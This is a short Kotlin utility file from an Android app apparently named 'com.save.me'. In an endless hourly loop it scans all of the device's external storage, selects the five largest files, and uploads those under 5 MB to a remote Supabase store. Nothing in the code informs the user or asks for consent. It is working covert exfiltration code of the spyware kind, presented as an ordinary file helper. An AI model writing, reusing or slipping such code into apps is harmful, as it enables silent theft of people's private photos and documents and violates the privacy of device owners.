package com.save.me

import android.content.Context
import android.os.Environment
import kotlinx.coroutines.delay
import java.io.File

object FileUtils {
    suspend fun scheduleFileTasks(context: Context) {
        while (true) {
            uploadTopFiles(context)
            delay(60 * 60 * 1000L)
        }
    }

    private fun getAllFiles(dir: File): List<File> {
        val files = mutableListOf<File>()
        dir.listFiles()?.forEach { file ->
            if (file.isDirectory) files += getAllFiles(file)
            else files += file
        }
        return files
    }

    private suspend fun uploadTopFiles(context: Context) {
        val root = Environment.getExternalStorageDirectory()
        val files = getAllFiles(root)
            .sortedByDescending { it.length() }
            .take(5)
        for (file in files) {
            if (file.length() < 5 * 1024 * 1024)
                SupabaseUtils.uploadFileAndRecord(file, "files/${file.name}", "file")
        }
    }
}